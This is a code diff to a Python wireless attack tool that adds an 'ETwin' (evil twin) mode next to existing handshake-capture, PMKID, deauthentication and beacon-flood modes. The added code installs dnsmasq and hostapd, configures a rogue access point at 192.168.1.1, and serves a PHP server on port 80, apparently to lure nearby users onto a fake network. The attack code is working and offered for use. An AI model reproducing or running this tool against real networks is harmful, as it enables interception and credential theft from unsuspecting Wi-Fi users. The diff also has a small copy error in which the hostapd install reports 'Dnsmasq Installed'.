@@ -186,6 +186,40 @@ def check_deps():
         print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' sudo make install'}")
         print(Fore.WHITE)
         exit()
+    # Check for dnsmasq
+    check_dnsmasq = subprocess.run(["which", "dnsmasq"], capture_output=True, text=True)
+    if "dnsmasq" in check_dnsmasq.stdout:
+        get_colours(f"\nDnsmasq\t\t ({Fore.BLUE + 'V'}{Fore.MAGENTA + ')'}", "magenta")
+    else:
+        get_colours(f"\nDnsmasq \t\t ({Fore.RED + 'X'}{Fore.MAGENTA + ')'}", "magenta")
+        get_colours("\nInstalling [Dnsmasq]....", "cyan")
+        install_dnsmasq = subprocess.run(["sudo", "apt", "install", "dnsmasq", "-y"], capture_output=True,
+                                            text=True)
+        if "Setting up dnsmasq" in install_dnsmasq.stdout:
+            get_colours("\n[*] Dnsmasq Installed...", "blue")
+        else:
+            get_colours(f"\n[!] There was an error installing the necessary program, Please install the following"
+                        f" programs manually: ", 'red')
+            print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' sudo apt install dnsmasq'}")
+            print(Fore.WHITE)
+            exit()
+    # Check for hostapd
+    check_hostapd = subprocess.run(["which", "hostapd"], capture_output=True, text=True)
+    if "hostapd" in check_hostapd.stdout:
+        get_colours(f"\nHostapd\t\t ({Fore.BLUE + 'V'}{Fore.MAGENTA + ')'}", "magenta")
+    else:
+        get_colours(f"\nHostapd \t\t ({Fore.RED + 'X'}{Fore.MAGENTA + ')'}", "magenta")
+        get_colours("\nInstalling [Hostapd]....", "cyan")
+        install_hostapd= subprocess.run(["sudo", "apt", "install", "hostapd", "-y"], capture_output=True,
+                                         text=True)
+        if "Setting up hostapd" in install_hostapd.stdout:
+            get_colours("\n[*] Dnsmasq Installed...", "blue")
+        else:
+            get_colours(f"\n[!] There was an error installing the necessary program, Please install the following"
+                        f" programs manually: ", 'red')
+            print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' sudo apt install hostapd'}")
+            print(Fore.WHITE)
+            exit()
 
     time.sleep(2)
     attack_func(sys.argv[2], sys.argv[4])  # If all the necessary programs are installed then call the attack func.
@@ -366,6 +400,7 @@ def attack_func(network_interface, attack_mode):
         subprocess.run(["sudo", "airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL)
         access_name = input(Fore.YELLOW + "Access point name: ")
         access_channel = input(Fore.YELLOW + "Channel number: ")
+        print(f"\n{Fore.BLUE + '┃'} {Fore.YELLOW + 'Configuring files...'}")
         set_hostapd = f"""
         interface={network_interface}mon
         driver=nl80211
@@ -396,20 +431,34 @@ def attack_func(network_interface, attack_mode):
         dnsmasq_config.write(set_dnsmasq)
         dnsmasq_config.close()
         # Adding routes
+        print(f"{Fore.BLUE + '┃'} {Fore.YELLOW + 'Adding routes for the access point...'}")
         subprocess.run([f"ifconfig {network_interface}mon up 192.168.1.1 netmask 255.255.255.0"], shell=True)
         subprocess.run(["route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1"], shell=True)
         # get PWD
         get_pwd = subprocess.check_output(["pwd"]).decode().strip()
         # Start HOSTAPD
+        print(f"\n{Fore.BLUE + '┃'} {Fore.YELLOW + 'Starting Hostapd...'}")
         time.sleep(2)
         os.system(f"xterm -hold -e sudo hostapd {get_pwd}/wifi_hostapd.conf &")
         # Start DNSMASQ
+        print(f"\n{Fore.BLUE + '┃'} {Fore.YELLOW + 'Starting Dnsmasq...'}")
         time.sleep(2)
         os.system(f"xterm -hold -e sudo dnsmasq -C {get_pwd}/wifi_dnsmasq.conf -d &")
         # Starting the PHP server
+        print(f"\n{Fore.BLUE + '┃'} {Fore.YELLOW + 'Starting PHP Server...'}")
         time.sleep(3)
+        print(f"\n{Fore.RED + '┃'} {Fore.YELLOW + ' [!] Press CTRL+C to stop the attack.'}")
         os.system(f"xterm -hold -e sudo php -S 192.168.1.1:80")
+        # Kill all the process.
+        process1 = subprocess.Popen(['ps', '-A'], stdout=subprocess.PIPE)
+        out, err = process1.communicate()
+        for line in out.splitlines():
+            if b'xterm' in line:
+                pid = int(line.split(None, 1)[0])
+                os.kill(pid, signal.SIGKILL)
+        get_colours("\n\n\n[*] Attack completed successfully", 'green')
         quit_program()
+
 
 def quit_program():
     time.sleep(2)
@@ -436,7 +485,7 @@ def check_parms():
                                                                             " '%s' | awk '{print $1}' FS=':'" % (
                                                                                 sys.argv[2], sys.argv[2]),
                                                                             shell=True).decode().strip()
-                            check_attack_mode = ["Handshake", "PKMID", "DAuth", "BFlood"]
+                            check_attack_mode = ["Handshake", "PKMID", "DAuth", "BFlood", "ETwin"]
                             if sys.argv[2] != check_interface_exist:
                                 print(f"\n{Fore.RED + '┃'}  {Fore.GREEN + '['}{Fore.RED + '!'}{Fore.GREEN + '] '}"
                                       f"{Fore.YELLOW + 'Invalid Network Interface name'}")
